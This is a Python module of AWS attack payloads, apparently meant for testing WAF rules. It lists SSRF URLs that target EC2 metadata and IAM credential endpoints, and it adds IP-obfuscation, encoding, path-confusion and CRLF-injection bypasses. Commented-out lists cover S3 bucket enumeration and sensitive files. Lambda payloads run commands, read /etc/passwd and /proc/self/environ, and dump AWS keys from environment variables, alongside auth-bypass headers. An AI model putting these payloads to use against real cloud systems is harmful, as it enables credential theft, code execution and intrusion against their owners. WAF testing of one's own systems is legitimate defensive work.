#!/usr/bin/env python3
"""
AWS-Specific Attack Vectors

This module contains attack vectors that are specific to AWS services and
infrastructure, focusing on AWS WAF bypass techniques and AWS-specific
vulnerabilities.
"""

class EC2MetadataVectors:
    """EC2 metadata service SSRF vectors for testing AWS WAF rules."""
    
    # Basic EC2 metadata service paths
    BASIC = [
        "http://169.254.169.254/latest/meta-data/",
        "http://169.254.169.254/latest/meta-data/ami-id",
        "http://169.254.169.254/latest/meta-data/hostname",
        "http://169.254.169.254/latest/meta-data/instance-id",
        "http://169.254.169.254/latest/meta-data/instance-type",
        "http://169.254.169.254/latest/meta-data/local-hostname",
        "http://169.254.169.254/latest/meta-data/local-ipv4",
        "http://169.254.169.254/latest/meta-data/mac",
        "http://169.254.169.254/latest/meta-data/placement/availability-zone",
        "http://169.254.169.254/latest/meta-data/placement/region",
        "http://169.254.169.254/latest/meta-data/profile",
        "http://169.254.169.254/latest/meta-data/public-hostname",
        "http://169.254.169.254/latest/meta-data/public-ipv4",
        "http://169.254.169.254/latest/meta-data/reservation-id",
        "http://169.254.169.254/latest/meta-data/security-groups",
        "http://169.254.169.254/latest/user-data",
        "http://169.254.169.254/latest/dynamic/instance-identity/document"
    ]
    
    # IAM security credentials paths (most sensitive)
    IAM = [
        "http://169.254.169.254/latest/meta-data/iam/",
        "http://169.254.169.254/latest/meta-data/iam/info",
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/role-name",  # Replace role-name with actual role
        "http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance",
        "http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance",
    ]
    
    # IMDSv2 token acquisition and usage
    IMDSV2 = [
        # For IMDSv2, you need to:
        # 1. Get a token with a PUT request
        "http://169.254.169.254/latest/api/token",  # PUT request with X-aws-ec2-metadata-token-ttl-seconds: 21600
        
        # 2. Use that token in subsequent requests with X-aws-ec2-metadata-token header
        "http://169.254.169.254/latest/meta-data/",  # GET with X-aws-ec2-metadata-token: TOKEN_VALUE
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",  # GET with token
    ]
    
    # IP obfuscation techniques for 169.254.169.254
    IP_OBFUSCATION = [
        # Decimal representation
        "http://2852039166/",
        "http://2852039166/latest/meta-data/",
        
        # Octal representation
        "http://0251.0376.0251.0376/",
        "http://0251.0376.0251.0376/latest/meta-data/",
        
        # Hex representation
        "http://0xa9fea9fe/",
        "http://0xa9fea9fe/latest/meta-data/",
        
        # Dotted hex
        "http://0xa9.0xfe.0xa9.0xfe/",
        "http://0xa9.0xfe.0xa9.0xfe/latest/meta-data/",
        
        # Dotted octal
        "http://0251.0376.0251.0376/",
        "http://0251.0376.0251.0376/latest/meta-data/",
        
        # Mixed format
        "http://169.0xfe.169.0xfe/",
        "http://169.0xfe.169.0xfe/latest/meta-data/",
        
        "http://0xa9.254.0xa9.254/",
        "http://0xa9.254.0xa9.254/latest/meta-data/",
        
        # IPv6 format
        "http://[::ffff:a9fe:a9fe]/",
        "http://[::ffff:a9fe:a9fe]/latest/meta-data/",
        
        "http://[::ffff:169.254.169.254]/",
        "http://[::ffff:169.254.169.254]/latest/meta-data/",
        
        # URL shorteners (conceptual examples)
        "http://tinyurl.com/aws-metadata",  # Would need to be set up
        "http://bit.ly/aws-metadata",       # Would need to be set up
    ]
    
    # URL encoding variations
    URL_ENCODING = [
        # Basic URL encoding
        "http://169.254.169.254/",
        "http://%31%36%39%2e%32%35%34%2e%31%36%39%2e%32%35%34/",
        "http://169.254.169.254/%6c%61%74%65%73%74/%6d%65%74%61%2d%64%61%74%61/",
        
        # Double encoding
        "http://%31%36%39%2e%32%35%34%2e%31%36%39%2e%32%35%34/",
        "http://%2531%2536%2539%252e%2532%2535%2534%252e%2531%2536%2539%252e%2532%2535%2534/",
        
        # Mixed encoding
        "http://169.254.169.%32%35%34/",
        "http://169.%32%35%34.169.254/",
        "http://%31%36%39.254.169.254/",
        
        # URL encoding with other IP formats
        "http://%30%78%61%39%2e%30%78%66%65%2e%30%78%61%39%2e%30%78%66%65/",  # Hex
        "http://%30%32%35%31%2e%30%33%37%36%2e%30%32%35%31%2e%30%33%37%36/",  # Octal
    ]
    
    # WAF bypass techniques specifically for EC2 metadata
    WAF_BYPASS = [
        # Alternative paths
        "http://169.254.169.254/",
        "http://169.254.169.254/latest",
        "http://169.254.169.254/latest/",
        "http://169.254.169.254/latest/meta-data",
        "http://169.254.169.254//latest//meta-data//",
        "http://169.254.169.254/./latest/./meta-data/./",
        "http://169.254.169.254/latest/meta-data/..;/",
        "http://169.254.169.254/%6c%61%74%65%73%74/%6d%65%74%61%2d%64%61%74%61/",
        
        # Protocol variations
        "https://169.254.169.254/latest/meta-data/",
        "http://169.254.169.254:80/latest/meta-data/",
        "http://169.254.169.254:443/latest/meta-data/",
        "http://169.254.169.254:8080/latest/meta-data/",
        "//169.254.169.254/latest/meta-data/",
        
        # Header manipulations
        "http://example.com/latest/meta-data/",  # With Host: 169.254.169.254
        "http://example.com/latest/meta-data/",  # With X-Forwarded-Host: 169.254.169.254
        "http://example.com/latest/meta-data/",  # With Forwarded: host=169.254.169.254
        
        # Redirect exploitation (conceptual)
        "http://example.com/redirect-to?url=http://169.254.169.254/latest/meta-data/",
        
        # DNS rebinding (conceptual)
        "http://metadata.example.com/latest/meta-data/",  # Would need DNS resolving to 169.254.169.254
        
        # SSRF via embedded protocols
        "http://169.254.169.254/latest/meta-data/?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "http://169.254.169.254/latest/meta-data/#http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        
        # Path confusion
        "http://169.254.169.254/xyz/../latest/meta-data/",
        "http://169.254.169.254/xyz/..%2flatest/meta-data/",
        "http://169.254.169.254/xyz/%2e%2e/latest/meta-data/",
        
        # Request splitting/CRLF injection (conceptual)
        "http://example.com/foo%0d%0aHost:%20169.254.169.254%0d%0aConnection:%20close%0d%0a%0d%0aGET%20/latest/meta-data/%20HTTP/1.1%0d%0aHost:%20169.254.169.254%0d%0aConnection:%20close%0d%0a%0d%0a",
    ]
    
    @classmethod
    def all(cls) -> list:
        """Return all EC2 metadata vectors."""
        return (
            cls.BASIC +
            cls.IAM +
            cls.IMDSV2 +
            cls.IP_OBFUSCATION +
            cls.URL_ENCODING +
            cls.WAF_BYPASS
        )
    
    @classmethod
    def basic(cls) -> list:
        """Return basic EC2 metadata vectors."""
        return cls.BASIC
    
    @classmethod
    def sensitive(cls) -> list:
        """Return sensitive EC2 metadata vectors (IAM credentials)."""
        return cls.IAM
    
    @classmethod
    def bypass(cls) -> list:
        """Return WAF bypass vectors for EC2 metadata."""
        return cls.WAF_BYPASS + cls.IP_OBFUSCATION + cls.URL_ENCODING


# class S3BucketVectors:
#     """S3 bucket enumeration and disclosure vectors for testing AWS WAF rules."""
    
#     # Basic S3 URL formats
#     BASIC = [
#         # Standard bucket URL formats
#         "https://BUCKET_NAME.s3.amazonaws.com/",
#         "https://s3.amazonaws.com/BUCKET_NAME/",
#         "https://s3.REGION.amazonaws.com/BUCKET_NAME/",
#         "https://BUCKET_NAME.s3.REGION.amazonaws.com/",
        
#         # With specific objects
#         "https://BUCKET_NAME.s3.amazonaws.com/file.txt",
#         "https://s3.amazonaws.com/BUCKET_NAME/file.txt",
#         "https://s3.amazonaws.com/BUCKET_NAME/path/to/file.txt",
        
#         # With specific API operations
#         "https://BUCKET_NAME.s3.amazonaws.com/?list-type=2",
#         "https://s3.amazonaws.com/BUCKET_NAME/?list-type=2",
#         "https://s3.amazonaws.com/BUCKET_NAME/?prefix=config",
#     ]
    
#     # Common sensitive files and paths in S3 buckets
#     SENSITIVE_FILES = [
#         # Configuration files
#         "/config.json",
#         "/config.yml",
#         "/config.xml",
#         "/settings.json",
#         "/env.json",
#         "/.env",
#         "/configuration.json",
#         "/credentials.json",
#         "/credentials.xml",
#         "/credentials.csv",
#         "/app-config.json",
#         "/database-config.json",
        
#         # Keys and secrets
#         "/keys/",
#         "/secrets/",
#         "/aws-keys.txt",
#         "/api-keys.json",
#         "/keys.txt",
#         "/id_rsa",
#         "/id_rsa.pub",
#         "/htpasswd",
#         "/password.txt",
#         "/passwords.txt",
        
#         # Database files
#         "/backup.sql",
#         "/backup.gz",
#         "/database-backup.sql",
#         "/db_backup.sql",
#         "/export.sql",
#         "/dump.sql",
        
#         # User data
#         "/users.csv",
#         "/users.json",
#         "/customers.csv",
#         "/customers.json",
#         "/accounts.json",
#         "/users-export.csv",
        
#         # Log files
#         "/logs/",
#         "/log/",
#         "/access.log",
#         "/error.log",
#         "/application.log",
#         "/app.log",
#         "/debug.log",
#         "/aws/logs/",
        
#         # Source code
#         "/.git/",
#         "/.git/config",
#         "/.git/HEAD",
#         "/src/",
#         "/source/",
#         "/app/",
#         "/dist/",
#         "/build/",
        
#         # Backup files
#         "/backup/",
#         "/backups/",
#         "/.bak",
#         "/old/",
#         "/archive/",
        
#         # Configuration files
#         "/web.config",
#         "/.htaccess",
#         "/wp-config.php",
#         "/config.php",
        
#         # AWS specific
#         "/cloudformation/",
#         "/cloudformation-template.json",
#         "/terraform/",
#         "/terraform.tfstate",
#         "/.aws/",
#         "/.aws/credentials",
#         "/.aws/config"
#     ]
    
#     # S3 bucket enumeration patterns
#     ENUMERATION = [
#         # Common company bucket patterns
#         "COMPANY-prod",
#         "COMPANY-dev",
#         "COMPANY-stage",
#         "COMPANY-staging",
#         "COMPANY-test",
#         "COMPANY-uat",
#         "COMPANY-qa",
#         "COMPANY-internal",
#         "COMPANY-public",
#         "COMPANY-private",
#         "COMPANY-files",
#         "COMPANY-data",
#         "COMPANY-assets",
#         "COMPANY-media",
#         "COMPANY-backup",
#         "COMPANY-backups",
#         "COMPANY-archive",
#         "COMPANY-archives",
#         "COMPANY-logs",
#         "COMPANY-logging",
#         "COMPANY-cloudtrail",
#         "COMPANY-cloudformation",
#         "COMPANY-terraform",
#         "COMPANY-config",
#         "COMPANY-configuration",
#         "COMPANY-analytics",
#         "COMPANY-metrics",
#         "COMPANY-billing",
#         "COMPANY-users",
#         "COMPANY-accounts",
#         "COMPANY-images",
#         "COMPANY-img",
#         "COMPANY-documents",
#         "COMPANY-docs",
#         "COMPANY-static",
#         "COMPANY-web",
#         "COMPANY-website",
#         "COMPANY-mobile",
#         "COMPANY-app",
#         "COMPANY-api",
#         "COMPANY-cdn",
#         "COMPANY-content",
#         "COMPANY-upload",
#         "COMPANY-uploads"
#     ]
    
#     # S3 URL manipulation and WAF bypass techniques
#     WAF_BYPASS = [
#         # Path traversal
#         "https://BUCKET_NAME.s3.amazonaws.com/../BUCKET_NAME/file.txt",
#         "https://BUCKET_NAME.s3.amazonaws.com/./././file.txt",
#         "https://BUCKET_NAME.s3.amazonaws.com/folder/../file.txt",
#         "https://BUCKET_NAME.s3.amazonaws.com/%2e%2e/file.txt",
        
#         # URL encoding variations
#         "https://%42%55%43%4b%45%54%5f%4e%41%4d%45.s3.amazonaws.com/",
#         "https://BUCKET_NAME.s3.amazonaws.com/%66%69%6c%65.%74%78%74",
#         "https://BUCKET_NAME.s3.%61%6d%61%7a%6f%6e%61%77%73.com/file.txt",
        
#         # Double encoding
#         "https://BUCKET_NAME.s3.amazonaws.com/%252e%252e/file.txt",
        
#         # Case variations
#         "https://bucket-name.S3.amazonaws.com/",
#         "https://BUCKET_NAME.s3.AMAZONAWS.com/",
#         "https://bucket_name.s3.amazonaws.COM/",
        
#         # Protocol and endpoint variations
#         "http://BUCKET_NAME.s3.amazonaws.com/",
#         "https://BUCKET_NAME.s3-website.REGION.amazonaws.com/",
#         "http://BUCKET_NAME.s3-website-REGION.amazonaws.com/",
        
#         # Specific S3 APIs
#         "https://BUCKET_NAME.s3.amazonaws.com/?acl",
#         "https://BUCKET_NAME.s3.amazonaws.com/?cors",
#         "https://BUCKET_NAME.s3.amazonaws.com/?lifecycle",
#         "https://BUCKET_NAME.s3.amazonaws.com/?policy",
#         "https://BUCKET_NAME.s3.amazonaws.com/?logging",
#         "https://BUCKET_NAME.s3.amazonaws.com/?versions",
#         "https://BUCKET_NAME.s3.amazonaws.com/?versioning",
#         "https://BUCKET_NAME.s3.amazonaws.com/?website",
        
#         # S3 presigned URLs (conceptual - would need actual signing)
#         "https://BUCKET_NAME.s3.amazonaws.com/file.txt?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIAIOSFODNN7EXAMPLE/20130524/us-east-1/s3/aws4_request&X-Amz-Date=20130524T000000Z&X-Amz-Expires=86400&X-Amz-SignedHeaders=host&X-Amz-Signature=SIGNATURE",
        
#         # XML API access
#         "https://s3.amazonaws.com/?prefix=BUCKET_NAME",
#         "https://s3.amazonaws.com/?marker=BUCKET_NAME",
#         "https://s3.amazonaws.com/?delimiter=/&prefix=BUCKET_NAME/"
#     ]
    
#     @classmethod
#     def all(cls) -> list:
#         """Return all S3 bucket vectors."""
#         return (
#             cls.BASIC +
#             [f"{base}{file}" for base in cls.BASIC for file in cls.SENSITIVE_FILES] +
#             [base.replace("BUCKET_NAME", bucket) for base in cls.BASIC for bucket in cls.ENUMERATION] +
#             cls.WAF_BYPASS
#         )
    
#     @classmethod
#     def basic(cls) -> list:
#         """Return basic S3 bucket vectors."""
#         return cls.BASIC
    
#     @classmethod
#     def sensitive(cls) -> list:
#         """Return vectors targeting sensitive files in S3 buckets."""
#         return [f"{base}{file}" for base in cls.BASIC for file in cls.SENSITIVE_FILES]
    
#     @classmethod
#     def enumeration(cls) -> list:
#         """Return S3 bucket enumeration vectors."""
#         return [base.replace("BUCKET_NAME", bucket) for base in cls.BASIC for bucket in cls.ENUMERATION]
    
#     @classmethod
#     def bypass(cls) -> list:
#         """Return WAF bypass vectors for S3 buckets."""
#         return cls.WAF_BYPASS


class LambdaExploitVectors:
    """AWS Lambda function exploitation vectors for testing AWS WAF rules."""
    
    # Basic Lambda function URL and API Gateway formats
    BASIC = [
        # Lambda function URLs
        "https://FUNCTION_ID.lambda-url.REGION.on.aws/",
        "https://FUNCTION_ID.lambda-url.REGION.on.aws/path",
        "https://FUNCTION_ID.lambda-url.REGION.on.aws/path?param=value",
        
        # API Gateway to Lambda
        "https://API_ID.execute-api.REGION.amazonaws.com/STAGE/",
        "https://API_ID.execute-api.REGION.amazonaws.com/STAGE/path",
        "https://API_ID.execute-api.REGION.amazonaws.com/STAGE/path?param=value",
        "https://API_ID.execute-api.REGION.amazonaws.com/STAGE/{proxy+}",
        
        # Custom domains (conceptual)
        "https://api.COMPANY.com/STAGE/FUNCTION",
        "https://lambda.COMPANY.com/FUNCTION"
    ]
    
    # Lambda environment variables and context access
    ENVIRONMENT = [
        # Environment variables exploitation
        "?env=true",
        "?environment=1",
        "?debug=true",
        "?printenv=1",
        "?dump=env",
        "?show=env",
        "?env_vars=1",
        "?lambda_env=true",
        "?aws_env=1",
        
        # AWS_* environment variables
        "?aws_region=1",
        "?aws_access_key_id=1",
        "?aws_secret_access_key=1",
        "?aws_session_token=1",
        "?aws_lambda_function_name=1",
        "?aws_lambda_function_version=1",
        "?aws_lambda_function_memory_size=1",
        "?aws_lambda_log_group_name=1",
        "?aws_lambda_log_stream_name=1",
        
        # Context object exploitation
        "?context=true",
        "?lambda_context=1",
        "?aws_context=1",
        "?ctx=1",
        "?print_context=true",
        "?dump_context=1"
    ]
    
    # Lambda function code execution and file access
    CODE_EXECUTION = [
        # Command execution
        "?cmd=ls%20-la",
        "?command=cat%20/etc/passwd",
        "?exec=id",
        "?run=pwd",
        "?system=env",
        
        # File access
        "?file=/var/task/index.js",
        "?read=/var/task/package.json",
        "?cat=/etc/passwd",
        "?path=/proc/self/environ",
        "?include=/var/runtime/node_modules/aws-sdk/package.json",
        
        # Node.js specific
        "?eval=process.env",
        "?code=console.log(process.env)",
        "?node=require('child_process').execSync('ls%20-la').toString()",
        "?js=Buffer.from(process.env.AWS_ACCESS_KEY_ID||'').toString()",
        "?require=fs.readFileSync('/var/task/index.js').toString()",
        
        # Python specific
        "?py=import%20os;os.system('ls%20-la')",
        "?python=import%20os;print(os.environ)",
        "?exec=import%20subprocess;subprocess.check_output(['cat','/etc/passwd'])",
        
        # Event and context manipulation
        "?event={\"isAdmin\":true}",
        "?input={\"bypass\":true}",
        "?lambda_event={\"admin\":true}",
        "?context={\"invokedFunctionArn\":\"ADMIN_ROLE\"}",
        
        # Internal AWS calls
        "?aws_sdk=true",
        "?list_buckets=1",
        "?s3_list=1",
        "?dynamodb_scan=1",
        "?secrets=1",
        "?ssm=1"
    ]
    
    # AWS Runtime API
    RUNTIME_API = [
        # Lambda Runtime API (localhost:9001)
        "/2018-06-01/runtime/invocation/next",
        "http://localhost:9001/2018-06-01/runtime/invocation/next",
        
        # Azure functions equivalent
        "http://localhost:7071/admin/host/invoke",
        
        # GCP functions equivalent 
        "http://localhost:8080/_ah/background",
        
        # Local emulation exploits
        "http://localhost:3000/2018-06-01/functions/FUNCTION_NAME/invocations",
        "http://host.docker.internal:9001/2018-06-01/runtime/invocation/next",
        
        # Runtime API response
        "/2018-06-01/runtime/invocation/INVOCATION_ID/response",
        "http://localhost:9001/2018-06-01/runtime/invocation/INVOCATION_ID/response",
        
        # Runtime API error
        "/2018-06-01/runtime/invocation/INVOCATION_ID/error",
        "http://localhost:9001/2018-06-01/runtime/invocation/INVOCATION_ID/error",
        
        # AWS Lambda internal APIs
        "http://127.0.0.1:9001/2018-06-01/runtime/invocation/next",
        "http://127.0.0.1:9001/2015-03-31/functions/FUNCTION_NAME/invocations",
        
        # Potential internal services
        "http://127.0.0.1:80/",
        "http://localhost:80/",
        "http://127.0.0.1:8080/",
        "http://localhost:8080/"
    ]
    
    # Lambda function WAF bypass techniques
    WAF_BYPASS = [
        # Path bypass attempts
        "/bypass",
        "/admin",
        "/internal",
        "/debug",
        "/.aws",
        "/_aws",
        "/aws",
        "/console",
        "/api",
        "/config",
        "/dev",
        "/development",
        "/test",
        "/beta",
        
        # Method bypass
        # These would need specific HTTP methods (POST, PUT, DELETE, etc.)
        "/ HTTP/1.1\r\nX-HTTP-Method-Override: PUT",
        "/ HTTP/1.1\r\nX-HTTP-Method: DELETE",
        "/ HTTP/1.1\r\nX-Method-Override: PATCH",
        
        # Header bypass
        # Various headers that might trigger different behavior
        "X-Debug: true",
        "X-Environment: development",
        "X-Mode: debug",
        "X-Test: 1",
        "X-Admin: true",
        "X-Internal: true",
        "X-Backend: lambda",
        
        # Auth bypass
        "Authorization: %[FILTERED]%",
        "Authorization: debug",
        "X-Api-Key: %[FILTERED]%",
        "X-Api-Key: debug",
        
        # Origin manipulation
        "Origin: null",
        "Origin: https://internal.aws.amazon.com",
        "Origin: https://console.aws.amazon.com",
        "Origin: https://localhost",
        "Origin: https://127.0.0.1",
        
        # Query parameter bypasses
        "?debug=true",
        "?internal=true",
        "?test=true",
        "?dev=true",
        "?bypass=true",
        "?admin=true",
        "?console=true",
        "?aws=true"
    ]
    
    @classmethod
    def all(cls) -> list:
        """Return all Lambda exploit vectors."""
        return (
            cls.BASIC +
            [f"{base}{env}" for base in cls.BASIC for env in cls.ENVIRONMENT] +
            [f"{base}{exec}" for base in cls.BASIC for exec in cls.CODE_EXECUTION] +
            cls.RUNTIME_API +
            [f"{base}{bypass}" for base in cls.BASIC for bypass in cls.WAF_BYPASS]
        )
    
    @classmethod
    def basic(cls) -> list:
        """Return basic Lambda function vectors."""
        return cls.BASIC
    
    @classmethod
    def environment(cls) -> list:
        """Return Lambda environment variable access vectors."""
        return [f"{base}{env}" for base in cls.BASIC for env in cls.ENVIRONMENT]
    
    @classmethod
    def code_execution(cls) -> list:
        """Return Lambda code execution vectors."""
        return [f"{base}{exec}" for base in cls.BASIC for exec in cls.CODE_EXECUTION]
    
    @classmethod
    def runtime_api(cls) -> list:
        """Return Lambda Runtime API vectors."""
        return cls.RUNTIME_API
    
    @classmethod
    def bypass(cls) -> list:
        """Return Lambda WAF bypass vectors."""
        return [f"{base}{bypass}" for base in cls.BASIC for bypass in cls.WAF_BYPASS]


if __name__ == "__main__":
    print("AWS-Specific Attack Vectors module loaded.")
    print("Available vector classes:")
    print("- EC2MetadataVectors: AWS EC2 metadata service SSRF vectors")
    print("- S3BucketVectors: S3 bucket enumeration and disclosure vectors")
    print("- LambdaExploitVectors: AWS Lambda function exploitation vectors")